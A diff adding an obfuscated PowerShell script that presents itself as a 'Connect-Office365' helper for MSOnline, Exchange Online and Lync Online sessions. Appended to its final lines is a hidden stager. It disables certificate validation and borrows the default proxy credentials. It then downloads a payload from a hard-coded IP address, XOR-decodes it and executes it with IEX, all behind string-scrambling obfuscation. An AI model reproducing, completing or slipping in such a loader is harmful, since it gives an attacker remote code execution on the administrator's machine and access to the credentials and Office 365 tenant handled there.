@@ -1,0 +1,91 @@
+ .("{2}{1}{0}"-f'EM','t-iT','SE')  ('Varia'+'BLE'+':o'+'79'+'5') (  [TYPE]("{1}{5}{0}{3}{6}{2}{4}"-f'T.sErvi','s','TmaN','CE','ager','YSTem.nE','POin')  ); &("{1}{0}{2}" -f 'Abl','seT-vARi','E')  ("{1}{0}"-f'wBrG','n')  (  [type]("{5}{0}{3}{1}{2}{4}"-F'tem.neT','wEBreq','ueS','.','t','Sys'));   &("{0}{2}{1}" -f'seT','M','-itE')  ("{1}{0}{2}{3}" -f ':C','VariAbLe','NlQ','h') ([typE]("{7}{1}{2}{0}{5}{3}{4}{6}"-F '.CR','ySteM.','NET','ENTiA','l','ED','cACHE','S') );  function cONne`Ct-`OFf`iC`e365
+{
+
+	[CmdletBinding()]
+	PARAM ()
+	BEGIN
+	{
+		TRY
+		{
+			
+			IF (-not (&("{2}{1}{0}" -f 'ule','-Mod','Get') -Name ("{2}{1}{0}" -f'e','lin','MSOn') -ListAvailable))
+			{
+				.("{1}{0}{2}{3}" -f 'rit','W','e-Verbo','se') -Message ("{7}{4}{6}{5}{1}{2}{3}{0}" -f'tory','zure',' Active Di','rec','rt m','le A','odu','BEGIN - Impo')
+				.("{0}{2}{1}"-f'Im','t-Module','por') -Name ("{1}{0}{2}" -f 'li','MSOn','ne') -ErrorAction ("{0}{1}"-f 'St','op') -ErrorVariable ("{1}{0}{3}{4}{5}{6}{2}" -f 'o','Err','e','rBe','ginIpmoMSOn','li','n')
+			}
+
+			IF (-not (&("{3}{0}{1}{2}"-f 'et-','Modu','le','G') -Name ("{5}{2}{4}{1}{3}{0}{6}" -f 'ecto','o','n','nn','lineC','LyncO','r') -ListAvailable))
+			{
+				.("{2}{1}{3}{0}"-f 'se','rite-Verb','W','o') -Message ("{4}{3}{5}{2}{7}{6}{0}{1}" -f 'n','e','mpor','EGIN','B',' - I',' Onli','t module Lync')
+				&("{1}{0}{3}{2}" -f 't-','Impor','ule','Mod') -Name ("{1}{4}{0}{2}{3}"-f 'nnec','LyncOnlin','to','r','eCo') -ErrorAction ("{0}{1}"-f 'Sto','p') -ErrorVariable ("{2}{0}{1}{3}{4}" -f'rro','rBeginIpmo','E','LyncOn','line')
+			}
+		}
+		CATCH
+		{
+			&("{0}{2}{3}{1}" -f 'Wri','arning','t','e-W') -Message ("{3}{0}{1}{4}{2}" -f'S','omething went wron','!','BEGIN - ','g')
+			IF (${eRr`orbEGi`N`Ip`MoMsONLINe})
+			{
+				.("{1}{2}{4}{3}{0}" -f 'ning','Wr','ite','War','-') -Message ("{1}{0}{8}{4}{9}{3}{7}{10}{11}{2}{6}{5}" -f '- Er','BEGIN ','e ','impor','hil','odule','m','tin','ror w','e ','g M','SOnlin')
+			}
+			IF (${er`Ro`RbE`gINi`pMoL`Yn`conlINE})
+			{
+				.("{2}{3}{1}{0}" -f'g','arnin','W','rite-W') -Message ("{8}{1}{5}{6}{0}{9}{3}{2}{4}{7}"-f 'ting ','N - Error whil','Conne','ncOnline','ct','e i','mpor','or module','BEGI','Ly')
+			}
+
+			&("{1}{3}{2}{0}" -f'arning','Wr','e-W','it') -Message ${E`RROr}[0]."ex`cE`PTIOn"."MEsS`A`gE"
+		}
+	}
+	PROCESS
+	{
+		TRY
+		{
+
+			
+			.("{1}{2}{0}"-f'e','Write-Verb','os') -Message ("{2}{8}{4}{3}{0}{1}{7}{5}{6}{9}"-f'k ','f','PROC','As','- ','r Office365',' Cre','o','ESS ','dential')
+			${o`36`5cREd} = .("{1}{0}{2}{3}"-f 'et','G','-Crede','ntial') -ErrorAction ("{1}{0}"-f 'op','St') -ErrorVariable ("{2}{3}{4}{1}{0}"-f 'l','redentia','E','rr','orC')
+
+			
+			&("{2}{0}{1}"-f'rite-Ve','rbose','W') -Message ("{7}{2}{0}{6}{5}{4}{12}{1}{9}{3}{10}{11}{8}" -f 'E','Azu','ROC',' Acti','nnect','Co','SS - ','P','ctory','re','ve',' Dire',' to ')
+			&("{2}{1}{3}{0}" -f'e','ect-MsolSer','Conn','vic') -Credential ${O36`5`crEd} -ErrorAction ("{1}{0}" -f 'top','S') -ErrorVariable ("{1}{3}{4}{2}{0}" -f 'nnectMSOL','E','o','r','rorC')
+
+			
+			&("{1}{0}{2}"-f '-V','Write','erbose') -Message ("{7}{1}{5}{8}{3}{4}{6}{0}{2}" -f'n','OCESS - Creat','e','a','nge on','e sessio','li','PR','n to Exch')
+			${ExcH`ANg`EuRl} = ("{4}{3}{1}{5}{0}{2}"-f'com/po','.outlo','wershell/','/ps','https:/','ok.')
+			${o`365`pS} = &("{0}{1}{2}" -f'New','-PSS','ession') -ConfigurationName ("{1}{0}{3}{2}" -f'E','Microsoft.','ange','xch') -ConnectionUri ${eX`CHan`ge`UrL} -Credential ${o36`5c`R`ed} -Authentication ("{0}{1}"-f 'B','asic') -AllowRedirection -ErrorAction ("{0}{1}" -f 'S','top') -ErrorVariable ("{3}{4}{0}{1}{2}" -f'nectExc','hang','e','Er','rorCon')
+
+			&("{0}{1}{2}{3}" -f 'Writ','e','-Verbo','se') -Message ("{4}{14}{8}{7}{9}{10}{13}{12}{0}{2}{1}{5}{3}{11}{6}"-f'xchange ','li','on','Clo','PROCE','ne (Prefix: ','d)','en','S - Op',' sessi','on ','u','E','to ','S')
+			&("{3}{1}{2}{4}{0}" -f 'SSession','r','t-','Impo','P') -Session ${O3`65`ps} ¡§CPrefix ("{1}{0}{2}" -f 'chCl','Ex','oud')
+
+			
+			&("{1}{0}{3}{2}"-f'e','Writ','ose','-Verb') -Message ("{8}{1}{4}{0}{3}{5}{6}{2}{7}"-f 't','C','l','e sessi','rea','on t','o Lync on','ine','PROCESS - ')
+			${Lyn`csE`SSiOn} = &("{2}{0}{3}{1}{4}" -f 'S','ss','New-CsOnline','e','ion') ¡§CCredential ${o`365`cReD} -ErrorAction ("{0}{1}" -f 'S','top') -ErrorVariable ("{0}{1}{3}{2}{4}"-f 'Error','ConnectExc','a','h','nge')
+			.("{1}{4}{2}{3}{0}" -f'ession','Imp','-','PSS','ort') -Session ${Ly`N`CSeSSIoN} -Prefix ("{0}{1}"-f 'Ly','ncCloud')
+
+			
+			
+		}
+		CATCH
+		{
+			.("{2}{0}{1}" -f'it','e-Warning','Wr') -Message ("{2}{1}{4}{5}{3}{6}{0}"-f'!',' ','PROCESS -','t wron','Some','thing wen','g')
+			IF (${E`Rr`orcrEdE`NtIal})
+			{
+				&("{0}{2}{1}{3}" -f 'Writ','-Wa','e','rning') -Message ("{6}{2}{3}{7}{8}{4}{0}{5}{1}" -f ' creden','al','SS',' - E','ile gathering','ti','PROCE','rror w','h')
+			}
+			IF (${erroRcoN`N`ECtms`OL})
+			{
+				&("{0}{2}{1}" -f 'Write-','arning','W') -Message ("{6}{10}{13}{1}{2}{3}{8}{12}{7}{9}{4}{5}{11}{0}"-f 'D','ESS - Error while co','nnecti','ng ','e',' ','P','zu','to','r','R','A',' A','OC')
+			}
+			IF (${Error`co`NnEcteX`c`Han`GE})
+			{
+				.("{1}{2}{3}{0}" -f'arning','W','rite-','W') -Message ("{1}{9}{0}{11}{6}{10}{7}{2}{5}{3}{4}{8}" -f'ESS ','PR',' ','nli','n','O','Error while connecting ','nge','e','OC','to Excha','- ')
+			}
+			IF (${Er`ROR`COnnECt`LyNC})
+			{
+				.("{0}{2}{1}"-f 'Write-','ng','Warni') -Message ("{4}{5}{6}{7}{3}{0}{1}{2}"-f 'onnecting to L','y','nc Online','- Error while c','PROC','E','SS',' ')
+			}
+
+			&("{0}{2}{1}{3}"-f 'W','i','r','te-Warning') -Message ${eRr`Or}[0]."EX`CEp`Ti`oN"."M`E`SSage"
+		}
+	}
+}
+${WC}=.("{1}{0}{2}"-f 'EC','NEW-OBj','T') ("{3}{0}{1}{2}{4}"-f 't','eM.NET.We','BClIen','SyS','t');${U}=("{13}{7}{0}{12}{3}{2}{4}{6}{9}{11}{5}{1}{8}{10}" -f '.0 (W',' rv:11.0)','ws NT','do',' 6.1','.0;','; WOW','a/5',' like Gec','64; Triden','ko','t/7','in','Mozill');  ${o7`95}::"s`eRveR`cER`TIFicAtEVaLiD`At`IONCalL`BAck" = {${T`RUE}};${WC}."h`EA`dErs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}{3}"-f 'Agen','U','ser-','t'),${U});${W`C}."Pro`Xy" =   ${Nw`BrG}::"defAU`LtwE`BPRo`XY";${w`C}."p`RoXY"."cR`edeNt`IaLS" =   ( &("{2}{1}{0}"-f 'teM','hiLdi','C') ("{0}{2}{1}" -f 'vari','H','abLE:cNLQ'))."VaL`UE"::"D`efAU`lTNE`T`wOR`KCrEDenTialS";${k}='0qoga`PzyB\pse]{_iO.G*Dd>uN=x?:S';${i}=0;[CHAr[]]${b}=([ChAR[]](${wC}.("{3}{1}{2}{0}{4}"-f'I','aD','Str','Downlo','nG').Invoke(("{5}{2}{4}{1}{3}{6}{0}"-f '.asp','248:4','/','4','/46.101.90.','https:','3/index'))))|&('%'){${_}-BXOr${k}[${I}++%${K}."lenG`TH"]};.("{0}{1}"-f'I','EX') (${b}-joiN'')
